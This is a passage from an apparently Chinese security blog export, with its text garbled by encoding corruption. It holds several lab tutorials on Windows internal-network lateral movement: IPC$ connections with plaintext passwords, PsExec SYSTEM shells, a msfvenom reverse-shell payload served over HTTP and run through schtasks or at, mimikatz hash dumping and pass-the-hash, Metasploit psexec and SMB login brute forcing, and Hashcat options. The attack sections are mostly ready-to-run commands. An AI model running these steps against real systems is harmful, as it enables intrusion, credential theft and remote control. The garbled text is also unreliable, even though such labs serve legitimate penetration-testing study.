<p>ä½¿ç”¨win7ä¸ç›®æ ‡æœºå»ºç«‹ipcè¿æ¥</p>
<p><code>net use  \\10.10.0.164\ipc$ &quot;admin123!&quot; /user:&quot;administartor&quot; </code></p>
<p>æŸ¥çœ‹ç›®æ ‡æœºå™¨çš„æ—¶é—´</p>
<p><code>net time \\10.10.0.164 </code></p>
<p>ä½¿ç”¨dirè¯»å–ç›®æ ‡æœºå™¨cç›˜çš„æ–‡ä»¶</p>
<p><code>dir \\10.10.0.164\c$ </code></p>
<p>ä½¿ç”¨typeè¯»å–ç›®æ ‡ä¸»æœºcç›˜ä¸‹çš„1.txt</p>
<p><code>type \\10.10.0.164\c$\1.txt</code></p>
<p>é€‰æ‹©å°†ç›®æ ‡ä¸»æœºçš„cç›˜æ˜ å°„åˆ°æœ¬åœ°zç›˜</p>
<p><code>net use z: \\10.10.0.164\c$ </code></p>
<p>åœ¨å»ºç«‹ipcè¿æ¥ååˆ©ç”¨Psexecåå¼¹cmd</p>
<p><code>Psexec.exe \\10.10.0.164 -s cmd.exe -acceptcula</code></p>
<p><img src="/posts/9527b68a/Psexec_cmd.png"> </p>
<p>åˆ é™¤æ˜ å°„çš„zç›˜</p>
<p><code>net use z: /del </code></p>
<p>åˆ é™¤ipc$è¿æ¥</p>
<p><code>net use \\10.10.0.164\ipc$ /del</code></p>
<p>åˆ é™¤å…¨éƒ¨</p>
<p><code>net use * /del </code></p>
<br>

<h3 id="IPC-è®¡åˆ’ä»»åŠ¡è¿›è¡Œæ¨ªå‘æ¸—é€"><a href="#IPC-è®¡åˆ’ä»»åŠ¡è¿›è¡Œæ¨ªå‘æ¸—é€" class="headerlink" title="IPC+è®¡åˆ’ä»»åŠ¡è¿›è¡Œæ¨ªå‘æ¸—é€"></a>IPC+è®¡åˆ’ä»»åŠ¡è¿›è¡Œæ¨ªå‘æ¸—é€</h3><h4 id="ä½¿ç”¨schtaskså‘½ä»¤"><a href="#ä½¿ç”¨schtaskså‘½ä»¤" class="headerlink" title="ä½¿ç”¨schtaskså‘½ä»¤"></a>ä½¿ç”¨schtaskså‘½ä»¤</h4><p>åˆ©ç”¨æµç¨‹</p>
<ol>
<li>ä¸ç›®æ ‡å»ºç«‹IPCè¿æ¥</li>
<li>ä½¿ç”¨copyå‘½ä»¤å°†æœ¨é©¬ã€å‘½ä»¤è„šæœ¬å¤åˆ¶åˆ°ç›®æ ‡æœºå™¨</li>
<li>ç›®æ ‡æœºå™¨åˆ›å»ºè®¡åˆ’ä»»åŠ¡ï¼Œä½¿å…¶è‡ªåŠ¨è§¦å‘æœ¨é©¬ã€è„šæœ¬</li>
<li>åˆ é™¤IPCè¿æ¥</li>
</ol>
<p>ç¯å¢ƒ</p>
<pre><code>æ”»å‡»æœº  192.168.0.128 (kali)

ç›®æ ‡æœº  192.168.0.164 (Win2012ï¼‰

è·³æ¿æœº  192.168.0.157 (WIn2008)
</code></pre>
<br>

<h5 id="è·³æ¿æœºä¸ç›®æ ‡æœºå»ºç«‹IPCè¿æ¥"><a href="#è·³æ¿æœºä¸ç›®æ ‡æœºå»ºç«‹IPCè¿æ¥" class="headerlink" title="è·³æ¿æœºä¸ç›®æ ‡æœºå»ºç«‹IPCè¿æ¥"></a>è·³æ¿æœºä¸ç›®æ ‡æœºå»ºç«‹IPCè¿æ¥</h5><p><code>net use \\192.168.0.164\ipc$ &quot;password&quot; /user:&quot;administrator&quot;</code></p>
<h5 id="kaliä¸Šç”Ÿæˆæœ¨é©¬"><a href="#kaliä¸Šç”Ÿæˆæœ¨é©¬" class="headerlink" title="kaliä¸Šç”Ÿæˆæœ¨é©¬"></a>kaliä¸Šç”Ÿæˆæœ¨é©¬</h5><p><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.157 lport=8888 -f exe &gt; shell.exe</code></p>
<h4 id="å°†shell-exeä¼ åˆ°è·³è½¬æœºä¸Š"><a href="#å°†shell-exeä¼ åˆ°è·³è½¬æœºä¸Š" class="headerlink" title="å°†shell.exeä¼ åˆ°è·³è½¬æœºä¸Š"></a>å°†shell.exeä¼ åˆ°è·³è½¬æœºä¸Š</h4><p>åœ¨kaliä¸Šå¼€å¯ä¸€ä¸ªhttpæœåŠ¡</p>
<p><code>python3 -m http.server 9999</code></p>
<p>åœ¨è·³è½¬æœºä¸Šè®¿é—®å¹¶ä¸‹è½½shell.exe</p>
<h5 id="åœ¨è·³è½¬æœºä¸Šä½¿ç”¨copyå‘½ä»¤å°†shell-exeå¤åˆ¶åˆ°ç›®æ ‡æœº"><a href="#åœ¨è·³è½¬æœºä¸Šä½¿ç”¨copyå‘½ä»¤å°†shell-exeå¤åˆ¶åˆ°ç›®æ ‡æœº" class="headerlink" title="åœ¨è·³è½¬æœºä¸Šä½¿ç”¨copyå‘½ä»¤å°†shell.exeå¤åˆ¶åˆ°ç›®æ ‡æœº"></a>åœ¨è·³è½¬æœºä¸Šä½¿ç”¨copyå‘½ä»¤å°†shell.exeå¤åˆ¶åˆ°ç›®æ ‡æœº</h5><p><code>copy shell.exe \\192.168.0.164\c$</code></p>
<p><img src="/posts/9527b68a/schtasks_dir.png"></p>
<h5 id="åˆ©ç”¨schtasksåˆ›å»ºä¸€ä¸ªåä¸ºshellçš„è®¡åˆ’å‘½ä»¤ï¼Œè¯¥å‘½ä»¤æ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡shell-exe"><a href="#åˆ©ç”¨schtasksåˆ›å»ºä¸€ä¸ªåä¸ºshellçš„è®¡åˆ’å‘½ä»¤ï¼Œè¯¥å‘½ä»¤æ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡shell-exe" class="headerlink" title="åˆ©ç”¨schtasksåˆ›å»ºä¸€ä¸ªåä¸ºshellçš„è®¡åˆ’å‘½ä»¤ï¼Œè¯¥å‘½ä»¤æ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡shell.exe"></a>åˆ©ç”¨schtasksåˆ›å»ºä¸€ä¸ªåä¸ºshellçš„è®¡åˆ’å‘½ä»¤ï¼Œè¯¥å‘½ä»¤æ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡shell.exe</h5><p><code>schtasks /create /s 192.168.0.164 /u &quot;administrator&quot; /p &quot;admin123!&quot; /tn shell /sc minute /mo 1 /tr  c:\shell.exe /ru sysytem /f</code></p>
<p><img src="/posts/9527b68a/schtasks1.png"></p>
<p>ä½¿ç”¨ncç›‘å¬win2008è·³è½¬æœºçš„8888ç«¯å£</p>
<p><img src="/posts/9527b68a/schtasks_nc.png"></p>
<h5 id="åˆ©ç”¨schtasks-æ‰§è¡Œå‘½ä»¤ï¼Œä½¿ç”¨typeè¯»å–æ–‡ä»¶å†…å®¹"><a href="#åˆ©ç”¨schtasks-æ‰§è¡Œå‘½ä»¤ï¼Œä½¿ç”¨typeè¯»å–æ–‡ä»¶å†…å®¹" class="headerlink" title="åˆ©ç”¨schtasks æ‰§è¡Œå‘½ä»¤ï¼Œä½¿ç”¨typeè¯»å–æ–‡ä»¶å†…å®¹"></a>åˆ©ç”¨schtasks æ‰§è¡Œå‘½ä»¤ï¼Œä½¿ç”¨typeè¯»å–æ–‡ä»¶å†…å®¹</h5><p><code>schtasjs /create /s 192.168.0.164 /u &quot;administrator&quot; /p &quot;admin123!&quot; /tn test /sc minute /mo 1 /tr &quot;c:\cmd.exe /c &#39;ipconfig &gt; c:\result.txt&#39;&quot;  /ru system /f</code></p>
<p><img src="/posts/9527b68a/schtasks2.PNG"></p>
<p>æŸ¥çœ‹æ˜¯å¦ç”Ÿæˆresult.txt</p>
<p><code>dir \\192.168.0.164\c$</code></p>
<p><img src="/posts/9527b68a/schtasks_dir2.png"></p>
<p>æŸ¥çœ‹result.txtçš„å†…å®¹</p>
<p><code>type \\192.168.0.164\c$\result.txt</code></p>
<p><img src="/posts/9527b68a/result.png"></p>
<h5 id="schtasks-åˆ é™¤è®¡åˆ’ä»»åŠ¡"><a href="#schtasks-åˆ é™¤è®¡åˆ’ä»»åŠ¡" class="headerlink" title="schtasks åˆ é™¤è®¡åˆ’ä»»åŠ¡"></a>schtasks åˆ é™¤è®¡åˆ’ä»»åŠ¡</h5><p><code>schtasks /Delete /s 192.168.0.164 /u &quot;administrator&quot; /p &quot;admin123!&quot; /tn test /f</code></p>
<p><img src="/posts/9527b68a/schtasks_delete.png"></p>
<h5 id="æ–­å¼€ipc-è¿æ¥"><a href="#æ–­å¼€ipc-è¿æ¥" class="headerlink" title="æ–­å¼€ipc$è¿æ¥"></a>æ–­å¼€ipc$è¿æ¥</h5><p><code>net use \\192.168.0.164\ipc$ /del  </code></p>
<h5 id="schtasks-å‚æ•°"><a href="#schtasks-å‚æ•°" class="headerlink" title="schtasks å‚æ•°"></a>schtasks å‚æ•°</h5><blockquote>
<p>S [ç›®æ ‡ä¸»æœº]<br>/U [ç›®æ ‡ç”¨æˆ·å]<br>/P [ç›®æ ‡å¯†ç ]<br>/TN [ä»»åŠ¡åç§°]<br>/TR [æ‰§è¡Œç¨‹åº]<br>/SC [æ‰§è¡Œæ–¹å¼ï¼Œonceä¸ºæ‰§è¡Œ1æ¬¡]<br>/ST [å®šæ—¶è®¡åˆ’æ‰§è¡Œæ—¶é—´]<br>/f  [é»˜è®¤ä¸ºYï¼Œä¸è¿›è¡Œå›æ˜¾äº¤äº’ï¼Œç›´æ¥è¿è¡Œ]<br>/i  [æ˜¾ç¤ºç¨‹åºçª—å£äº¤äº’]</p>
</blockquote>
<h4 id="ä½¿ç”¨atå‘½ä»¤"><a href="#ä½¿ç”¨atå‘½ä»¤" class="headerlink" title="ä½¿ç”¨atå‘½ä»¤"></a>ä½¿ç”¨atå‘½ä»¤</h4><p>atå‘½ä»¤å’Œschtaskså‘½ä»¤ç±»ä¼¼</p>
<p>æ³¨æ„: Windows Server 2012 ä»¥åçš„ç‰ˆæœ¬æ²¡æœ‰atå‘½ä»¤ï¼Œåªæœ‰schtaskså‘½ä»¤<br>æ‰€ä»¥åœ¨è¿™é‡Œä½¿ç”¨win7 ä»£æ›¿ä¹‹å‰ä½¿ç”¨çš„win2012<br>ç¯å¢ƒ<br>win7  192.168.0.129<br>win2008 192.168.0.157</p>
<h5 id="ä¸å»ºç«‹ç›®æ ‡æœºå™¨å»ºç«‹IPCè¿æ¥"><a href="#ä¸å»ºç«‹ç›®æ ‡æœºå™¨å»ºç«‹IPCè¿æ¥" class="headerlink" title="ä¸å»ºç«‹ç›®æ ‡æœºå™¨å»ºç«‹IPCè¿æ¥"></a>ä¸å»ºç«‹ç›®æ ‡æœºå™¨å»ºç«‹IPCè¿æ¥</h5><p><code>net use \\192.168.0.157\ipc$ &quot;admin123!&quot; /user:&quot;administrator&quot;  </code></p>
<h5 id="åœ¨è·³è½¬æœºä¸Šä½¿ç”¨copyå‘½ä»¤å°†shell2-exeå¤åˆ¶åˆ°ç›®æ ‡æœº"><a href="#åœ¨è·³è½¬æœºä¸Šä½¿ç”¨copyå‘½ä»¤å°†shell2-exeå¤åˆ¶åˆ°ç›®æ ‡æœº" class="headerlink" title="åœ¨è·³è½¬æœºä¸Šä½¿ç”¨copyå‘½ä»¤å°†shell2.exeå¤åˆ¶åˆ°ç›®æ ‡æœº"></a>åœ¨è·³è½¬æœºä¸Šä½¿ç”¨copyå‘½ä»¤å°†shell2.exeå¤åˆ¶åˆ°ç›®æ ‡æœº</h5><p><code>copy shell2.exe \\192.168.0.157\c$</code></p>
<h5 id="ä½¿ç”¨atå‘½ä»¤åˆ›å»ºè®¡åˆ’ä»»åŠ¡-1"><a href="#ä½¿ç”¨atå‘½ä»¤åˆ›å»ºè®¡åˆ’ä»»åŠ¡-1" class="headerlink" title="ä½¿ç”¨atå‘½ä»¤åˆ›å»ºè®¡åˆ’ä»»åŠ¡"></a>ä½¿ç”¨atå‘½ä»¤åˆ›å»ºè®¡åˆ’ä»»åŠ¡</h5><p>æŸ¥çœ‹ç›®æ ‡æœºå™¨æ—¶é—´</p>
<p><code>net time \\192.168.0.157 </code> è¿™é‡Œçš„æ—¶é—´å¯èƒ½ä¸æœ¬åœ°ä¸ç¬¦åˆ</p>
<p><code>at \\192.168.0.157 2:13:00 c:\shell2.exe</code> </p>
<p><img src="/posts/9527b68a/at_shell2.png"></p>
<h5 id="æŸ¥çœ‹ä»»åŠ¡åˆ—è¡¨"><a href="#æŸ¥çœ‹ä»»åŠ¡åˆ—è¡¨" class="headerlink" title="æŸ¥çœ‹ä»»åŠ¡åˆ—è¡¨"></a>æŸ¥çœ‹ä»»åŠ¡åˆ—è¡¨</h5><p><code>at \\192.168.0.157 </code><br><img src="/posts/9527b68a/at_shell3.png"></p>
<br>

<br>

<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="https://www.secrss.com/articles/26810">https://www.secrss.com/articles/26810</a></p>
<p><a href="http://t3ngyu.leanote.com/post/LM-AT-SCHTASKS">http://t3ngyu.leanote.com/post/LM-AT-SCHTASKS</a></p>
<p><a href="https://www.cnblogs.com/mindzone/p/14293851.html">https://www.cnblogs.com/mindzone/p/14293851.html</a></p>
</blockquote>
]]></content>
      <categories>
        <category>å†…ç½‘æ¸—é€</category>
      </categories>
      <tags>
        <tag>å†…ç½‘æ¸—é€</tag>
      </tags>
  </entry>
  <entry>
    <title>Hashpth</title>
    <url>/posts/350b40a4/</url>
    <content><![CDATA[<h3 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><p>PASS The Hash ä¹Ÿå«Hashä¼ é€’æ”»å‡»ï¼Œç®€ç§° PTHã€‚ç”¨æˆ·ç™»å½•å¯ä»¥ä¸éœ€è¦æ˜æ–‡å¯†ç åªéœ€è¦è·å–åˆ°Hash å°±å¯ä»¥ç™»å½•ç›®æ ‡ç³»ç»Ÿã€‚</p>
<p>åœ¨åŸŸä¸­ï¼Œç”¨æˆ·ç™»å½•çš„è´¦å·å¯†ç å¤§éƒ½æ˜¯ç›¸åŒçš„ï¼Œæ‰€ä»¥æ”»å‡»è€…å¯ä»¥é€šè¿‡Hashä¼ é€’æ¥å°è¯•ç™»å½•å†…ç½‘çš„å…¶ä»–è®¡ç®—æœº.é€šè¿‡ä½¿ç”¨å“ˆå¸Œä¼ é€’æ”»å‡»ï¼Œæ”»å‡»è€…ä¸éœ€è¦ç ´è§£å¯†ç æ•£åˆ—å€¼</p>
<h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>åœ¨windowsç³»ç»Ÿä¸­ï¼Œé€šå¸¸ä¼šä½¿ç”¨NTLMè¿›è¡Œèº«ä»½éªŒè¯ï¼Œåœ¨ä½¿ç”¨NTLMåšèº«ä»½éªŒè¯æ—¶ï¼Œä¸ä¼šä½¿ç”¨æ˜æ–‡å¯†ç ä½œä¸ºèº«ä»½éªŒè¯ï¼Œè€Œæ˜¯ä½¿ç”¨æ˜æ–‡å¯†ç åŠ å¯†è¿‡çš„Hashå€¼ä½œä¸ºèº«ä»½éªŒè¯çš„å‡­æ®ã€‚æ”»å‡»è€…å¯ä»¥ç›´æ¥é€šè¿‡LM Hash å’ŒNTLM Hash è®¿é—®è¿œç¨‹ä¸»æœºæˆ–æœåŠ¡ï¼Œè€Œä¸éœ€è¦æä¾›æ˜æ–‡å¯†ç ã€‚</p>
<h3 id="æ”»å‡»æ–¹å¼"><a href="#æ”»å‡»æ–¹å¼" class="headerlink" title="æ”»å‡»æ–¹å¼"></a>æ”»å‡»æ–¹å¼</h3><ul>
<li><p>è·å–ä¸€å°åŸŸä¸»æœºçš„é«˜ï¼ˆadminæˆ–è€…systemï¼‰æƒé™</p>
</li>
<li><p>åˆ©ç”¨mimikatzç­‰å·¥å…·å¯¼å‡ºhash</p>
</li>
<li><p>åˆ©ç”¨å¯¼å‡ºçš„hashå°è¯•ç™»å½•å…¶ä»–çš„åŸŸå†…ä¸»æœº</p>
</li>
</ul>
<h3 id="hash-pthæ”»å‡»"><a href="#hash-pthæ”»å‡»" class="headerlink" title="hash pthæ”»å‡»"></a>hash pthæ”»å‡»</h3><h4 id="ä½¿ç”¨mimikatz-è¿›è¡Œpth"><a href="#ä½¿ç”¨mimikatz-è¿›è¡Œpth" class="headerlink" title="ä½¿ç”¨mimikatz è¿›è¡Œpth"></a>ä½¿ç”¨mimikatz è¿›è¡Œpth</h4><p>åœ¨Windows Server 2012ä¸­æ‰“å¼€mimikatz  </p>
<p><code>privilege::debug</code></p>
<p><code>sekurlsa::msv</code></p>
<p><img src="/posts/350b40a4/msv.png"></p>
<p>å¾—åˆ°hashå€¼ä¸º  <code>4cb55ea6471d29ccbb2ce4cf00271fe3</code></p>
<p>ä½†æ˜¯åœ¨è¿™é‡Œå¦‚æœé€‰æ‹©ç›´æ¥å¤åˆ¶mimikatzä¸­çš„ä¿¡æ¯çš„è¯ï¼Œç¨‹åºä¼šç›´æ¥å¡æ­»ï¼Œæ‰€ä»¥å¯ä»¥é€‰æ‹©å¼€å¯æ—¥å¿— <code>log</code></p>
<p><code>privilege::debug</code></p>
<p><code>sekurlsa::pth /user:Administrator /domain:mamor /ntlm:32ed87bdb5fdc5e9cba88547376818d4</code></p>
<p><img src="/posts/350b40a4/pth.png"></p>
<p>è¿è¡Œå®Œå‘½ä»¤ä¼šå¼¹å‡ºcmd.exe</p>
<p><img src="/posts/350b40a4/pth2.png"></p>
<p>æˆåŠŸè®¿é—®åˆ°åŸŸå†…çš„å¦ä¸€å°ç›¸åŒå¯†ç çš„æœºå™¨çš„Cç›˜</p>
<p><img src="/posts/350b40a4/pth_cmd.png"></p>
<p>å¯¹äºå®‰è£…KB2871991è¡¥ä¸åçš„æœºå™¨ï¼Œæ— æ³•ä½¿ç”¨å¸¸è§„çš„å“ˆå¸Œä¼ é€’è¿›è¡Œæ¨ªå‘ç§»åŠ¨ï¼Œä½†æ˜¯å¯¹äºAdministratorï¼ˆSIDä¸º500çš„è´¦å·ï¼‰çš„æ•£åˆ—å€¼ä»å¯ä»¥è¿›è¡Œå“ˆå¸Œä¼ é€’ã€‚ä¹Ÿå°±æ˜¯è¯´åªè¦SIDä¸º500çš„è´¦å·è¿›è¡Œæ¨ªå‘æ¸—é€æ—¶ä¸ä¼šè¢«è¯¥è¡¥ä¸æ‰€å½±å“ã€‚</p>
<h4 id="åˆ©ç”¨wmiexec-pyè¿›è¡Œpthæ”»å‡»"><a href="#åˆ©ç”¨wmiexec-pyè¿›è¡Œpthæ”»å‡»" class="headerlink" title="åˆ©ç”¨wmiexec.pyè¿›è¡Œpthæ”»å‡»"></a>åˆ©ç”¨wmiexec.pyè¿›è¡Œpthæ”»å‡»</h4><p>ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p>
<br>

<h4 id="ä½¿ç”¨msfä¸­çš„æ¨¡å—è¿›è¡Œpthæ”»å‡»"><a href="#ä½¿ç”¨msfä¸­çš„æ¨¡å—è¿›è¡Œpthæ”»å‡»" class="headerlink" title="ä½¿ç”¨msfä¸­çš„æ¨¡å—è¿›è¡Œpthæ”»å‡»"></a>ä½¿ç”¨msfä¸­çš„æ¨¡å—è¿›è¡Œpthæ”»å‡»</h4><h4 id="Psexec"><a href="#Psexec" class="headerlink" title="Psexec"></a>Psexec</h4><p>ç¯å¢ƒï¼š</p>
<p>Windows2012  192.168.0.161 10.10.0.161</p>
<p>kali  192.168.0.128</p>
<p>æ¡ä»¶ ï¼š</p>
<ol>
<li>å¼€å¯445ç«¯å£SMBæœåŠ¡ï¼ˆé»˜è®¤å¼€å¯ï¼‰</li>
<li>å¼€å¯admin$å…±äº«</li>
</ol>
<p>**<a href="https://asecuritysite.com/encryption/lmhash">https://asecuritysite.com/encryption/lmhash</a> **</p>
<p>å¯ä»¥å°†å¯†ç è½¬æ¢ä¸ºLM-Hash å’Œ NTLM-Hash (LMHASH:NTHASH æ ¼å¼) </p>
<p>åˆ©ç”¨ï¼š</p>
<p>use exploit/windows/smb/psexec<br>set RHOSTS 192.168.0.161<br>set payload windows/meterpreter/reverse_tcpï¼ˆé»˜è®¤payloadï¼‰<br>set LPORT 4444<br>set LHOST 192.168.0.128<br>set SMBUSER Administrator<br>set SMBPASS admin123!        ï¼ˆè®¾ç½®å¯†ç æ˜æ–‡æˆ–è€…hashå€¼ æ¥è¿›è¡Œpthï¼‰<br>set SMBDomain mamor<br>exploit</p>
<p><img src="/posts/350b40a4/msf_psexec.png"></p>
<h5 id="SMB-pthæ”»å‡»"><a href="#SMB-pthæ”»å‡»" class="headerlink" title="SMB pthæ”»å‡»"></a>SMB pthæ”»å‡»</h5><p>Metasploitæœ‰ä¸€ä¸ªauxiliaryè¾…åŠ©æ¨¡å—ï¼Œå¯ä»¥é€šè¿‡SMBç™»å½•åˆ°ç½‘ç»œä¸­ã€‚è¿™ä¸ªæ¨¡å—éœ€è¦ç”¨æˆ·åå’Œhashå­—å…¸ï¼Œå°†æ”¶é›†çš„ç”¨æˆ·åå’Œhashåˆ¶ä½œæˆäº†å­—å…¸ï¼Œå»çˆ†ç ´æœ‰æ•ˆçš„ç”¨æˆ·åå’Œhashç»„åˆã€‚å½“ç„¶å¦‚æœæœ‰ç”¨æˆ·å å¯†ç çš„å­—å…¸ä¹Ÿå¯ä»¥ä½¿ç”¨æ­¤æ¨¡å—è¿›è¡Œçˆ†ç ´</p>
<p><code>use auxiliary/scanner/smb/smb_login</code></p>
<p><code>set rhosts 192.168.0.157</code><br><code>set user_file /home/kali/Common/user.txt</code><br><code>set pass_file /home/kali/Common/password.txt</code><br><code>set smbdomain mamor</code><br><code>exploit</code></p>
<p><img src="/posts/350b40a4/smb_pth1.png"></p>
<p><img src="/posts/350b40a4/smb_pth2.png"></p>
<br>

<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="http://www.feidao.site/wordpress/?p=2084">http://www.feidao.site/wordpress/?p=2084</a></p>
<p><a href="https://www.cnblogs.com/zzjdbk/p/14507846.html">https://www.cnblogs.com/zzjdbk/p/14507846.html</a></p>
<p><a href="https://yoga7xm.top/2019/04/12/IPentest-domain3/">https://yoga7xm.top/2019/04/12/IPentest-domain3/</a></p>
<p><a href="https://blog.csdn.net/zzlx123/article/details/103595197">https://blog.csdn.net/zzlx123/article/details/103595197</a></p>
</blockquote>
]]></content>
      <categories>
        <category>å†…ç½‘æ¸—é€</category>
      </categories>
      <tags>
        <tag>å†…ç½‘æ¸—é€</tag>
      </tags>
  </entry>
  <entry>
    <title>Hashcatä½¿ç”¨</title>
    <url>/posts/de6bd435/</url>
    <content><![CDATA[<p>Hashcat â€“help å‚çœ‹hashcat å¸®åŠ©æ–‡æ¡£ </p>
<br>

<p>-m  è¡¨ç¤ºæ•£åˆ—ç®—æ³•ç±»å‹</p>
<p>-m 1000 ï¼ˆNTLMï¼‰</p>
<p><img src="/posts/de6bd435/Hash_modes.png"></p>
<p>-a  æŒ‡å®šç ´è§£æ¨¡å¼ï¼Œå¸¸ç”¨ straight å­—å…¸ç ´è§£ å’Œ brute-force æš´åŠ›ç ´è§£</p>
<blockquote>
<p>0 = Straight        //å­—å…¸ç ´è§£</p>
<p>1 = Combination        //ç»„åˆç ´è§£</p>
<p>3 = Brute-force        //æ©ç æš´åŠ›ç ´è§£</p>
<p>6 = Hybrid Wordlist + Mask        </p>
<p>7 = Hybrid Mask + Wordlist</p>
<p>9 = Association</p>
</blockquote>
<p><img src="/posts/de6bd435/Hash_Attack.png"></p>
<br>

<h4 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h4><p><code>hashcat -a 0 -m xx &lt;hashfile&gt; &lt;zidian1&gt; &lt;zidian2&gt;</code></p>
<blockquote>
<p>-m                           æŒ‡å®šå“ˆå¸Œç±»å‹</p>
<p>-a                            æŒ‡å®šç ´è§£æ¨¡å¼</p>
<p>-V                            æŸ¥çœ‹ç‰ˆæœ¬ä¿¡æ¯</p>
<p>-o                            å°†è¾“å‡ºç»“æœå‚¨å­˜åˆ°æŒ‡å®šæ–‡ä»¶</p>
<p>â€“force                     å¿½ç•¥è­¦å‘Š</p>
<p>â€“show                    ä»…æ˜¾ç¤ºç ´è§£çš„hashå¯†ç å’Œå¯¹åº”çš„æ˜æ–‡</p>
<p>â€“remove                 ä»æºæ–‡ä»¶ä¸­åˆ é™¤ç ´è§£æˆåŠŸçš„hash</p>
<p>â€“username             å¿½ç•¥hashè¡¨ä¸­çš„ç”¨æˆ·å</p>
<p>-b                             æµ‹è¯•è®¡ç®—æœºç ´è§£é€Ÿåº¦å’Œç›¸å…³ç¡¬ä»¶ä¿¡æ¯</p>
<p>-O                            é™åˆ¶å¯†ç é•¿åº¦</p>
<p>-T                            è®¾ç½®çº¿ç¨‹æ•°</p>
<p>-r                             ä½¿ç”¨è§„åˆ™æ–‡ä»¶</p>
<p>-1                             è‡ªå®šä¹‰å­—ç¬¦é›†  -1 0123asd     ?1={0123asd}</p>
<p>-2                             è‡ªå®šä¹‰å­—ç¬¦é›†  -2 0123asd    ?2={0123asd}</p>
<p>-3                             è‡ªå®šä¹‰å­—ç¬¦é›†  -3 0123asd    ?3={0123asd}</p>
<p>-i                              å¯ç”¨å¢é‡ç ´è§£æ¨¡å¼</p>
<p>â€“increment-min       è®¾ç½®å¯†ç æœ€å°é•¿åº¦</p>
<p>â€“increment-max      è®¾ç½®å¯†ç æœ€å¤§é•¿åº¦</p>
</blockquote>
]]></content>
      <categories>
        <category>å†…ç½‘æ¸—é€</category>
      </categories>
      <tags>
        <tag>å†…ç½‘æ¸—é€</tag>
      </tags>
  </entry>
  <entry>
    <title>Windowsç”¨æˆ·å¯†ç åŠ å¯†æ–¹æ³•ä¸ç ´è§£</title>
    <url>/posts/11da9eaf/</url>
    <content><![CDATA[<br>

<h3 id="Windows-Hash"><a href="#Windows-Hash" class="headerlink" title="Windows Hash"></a>Windows Hash</h3><h4 id="LM-Hash"><a href="#LM-Hash" class="headerlink" title="LM Hash"></a>LM Hash</h4><p>LAN Manager (LM) Hash æ—¶WIndows ç³»ç»Ÿæ‰€ç”¨çš„ç¬¬ä¸€ç§å¯†ç å“ˆå¸Œç®—æ³•ï¼Œæœ¬è´¨ä¸ºDESåŠ å¯†</p>
<h5 id="LM-Hash-ç”ŸæˆåŸç†"><a href="#LM-Hash-ç”ŸæˆåŸç†" class="headerlink" title="LM Hash ç”ŸæˆåŸç†"></a>LM Hash ç”ŸæˆåŸç†</h5><ul>
<li><p>1.ç”¨æˆ·å¯†ç è½¬æ¢ä¸ºå¤§å†™ï¼Œæœ€å¤§é•¿åº¦é™åˆ¶ä¸º14ä¸ªå­—ç¬¦ï¼Œ</p>
</li>
<li><p>2.å¯†ç è½¬æ¢ä¸º16è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œä¸è¶³14ä¸ªå­—èŠ‚å°†ç”¨0æ¥è¡¥å…¨</p>
</li>
<li><p>3.å¯†ç çš„16è¿›åˆ¶è¢«åˆ†æˆä¸¤ä¸ª7byteéƒ¨åˆ†ï¼Œæ¯éƒ¨åˆ†è½¬æ¢æˆæ¯”ç‰¹æµï¼Œå¹¶ä¸”é•¿åº¦ä¸ºä¸º56bitï¼Œé•¿åº¦ä¸è¶³åˆ™åœ¨å·¦è¾¹ç”¨0è¡¥é½</p>
</li>
<li><p>4.å†åˆ†ä¸º7bitä¸ºä¸€ç»„ï¼Œæ¯ç»„æœ«å°¾åŠ 0ï¼Œå†ç»„æˆä¸€ç»„</p>
</li>
<li><p>5.å°†ä»¥ä¸Šæ­¥éª¤å¾—åˆ°çš„ä¸¤ç»„8å­—èŠ‚ç¼–ç ï¼Œåˆ†åˆ«ä½œä¸ºDESåŠ å¯†keyä¸ºé­”æœ¯å­—ç¬¦ä¸²â€œKGS!@#$% â€è¿›è¡ŒåŠ å¯†</p>
</li>
</ul>
<br>

<p>å‚è€ƒ<a href="https://blog.csdn.net/endeav_or/article/details/50196325">https://blog.csdn.net/endeav_or/article/details/50196325</a></p>
<p>ä»¥è¿™ç¯‡æ–‡å­—ç»™å‡ºçš„ 123994 ä¸ºä¾‹</p>
<p>å°† 123994 ä½¿ç”¨æ–‡æœ¬ç¼–è¾‘å™¨ è½¬æ¢ä¸ºåå…­è¿›åˆ¶ </p>
<p><img src="/posts/11da9eaf/LM-Hash1.png"></p>
<p>è½¬æ¢å ä¸º <code>313233393934</code> (12*4 bits) è€Œä¸ºäº†æ»¡è¶³14å­—èŠ‚(14 * 8 bits) åç»­å…¨éƒ½ç”¨0è¡¥å…¨</p>
<p>æ‰€ä»¥ è¡¥å…¨åçš„åå…­è¿›åˆ¶ä¸º <code>3132333939340000 0000000000000000</code></p>
<p>å°†ä»¥ä¸Šç¼–ç åˆ†è¯2ç»„7å­—èŠ‚(7*8 bits)   <code>3132333939340000</code>  <code>0000000000000000</code></p>
<p>å°†ä»¥ä¸Šä¸¤ç»„7å­—èŠ‚çš„åå…­è¿›åˆ¶è½¬æ¢ä¸º äºŒè¿›åˆ¶ï¼Œæ¯7bit ä¸€ç»„æœ«å°¾åŠ 0ï¼Œå†è½¬æ¢ä¸ºåå…­è¿›åˆ¶ç»„æˆçš„ä¸¤ç»„8å­—èŠ‚çš„ç¼–ç </p>
<p><code>31323339393400</code> è½¬æ¢ä¸º äºŒè¿›åˆ¶ä½</p>
